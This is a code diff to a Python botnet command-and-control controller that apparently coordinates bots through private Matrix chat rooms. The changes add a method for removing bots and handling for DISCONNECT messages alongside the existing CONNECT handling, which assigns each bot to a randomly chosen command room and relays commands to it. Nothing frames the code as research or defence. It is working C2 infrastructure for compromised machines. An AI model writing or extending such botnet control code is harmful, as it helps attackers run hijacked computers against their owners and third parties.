@@ -52,6 +52,9 @@ class CommandRoom:
         self.bots[bot.bot_id] = bot
         return bot
     
+    def remove_bot(self, bot_id):
+        del self.bots[bot_id]
+    
     def send_cmd(self, cmd):
         return self.room.send_text(cmd)
         
@@ -113,18 +116,22 @@ class BotnetController:
 
     def on_message(self, room, event):
         msgbody: str = event["content"]["body"]
-        if not msgbody.startswith("CONNECT:"):
-            return
-        msgbody = msgbody.removeprefix("CONNECT:")
-        msgbody = json.loads(msgbody)
-        botid = msgbody["bot_id"]
-        # TODO: no room available? -> send RETRY IN: 
-        # Uniform distr so should be fine
-        room_id = random.choice(list(self.command_rooms.keys()))
-        self.announce_room.send_text(
-            f"RESOLVE {botid}:{room_id}"
-        )
-        self.assign_bot(msgbody, room_id)
+        action, info = msgbody.split(":", 1)
+        if action == "CONNECT":
+            msgbody = msgbody.removeprefix("CONNECT:")
+            msgbody = json.loads(msgbody)
+            botid = msgbody["bot_id"]
+            # TODO: no room available? -> send RETRY IN: 
+            # Uniform distr so should be fine
+            room_id = random.choice(list(self.command_rooms.keys()))
+            self.announce_room.send_text(
+                f"RESOLVE {botid}:{room_id}"
+            )
+            self.assign_bot(msgbody, room_id)
+        elif action == "DISCONNECT":
+            room_id, bot_id = info.rsplit(":", 1)
+            self.command_rooms[room_id].remove_bot(bot_id)
+
             
     def create_room(self, name: str) -> Room:
         room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
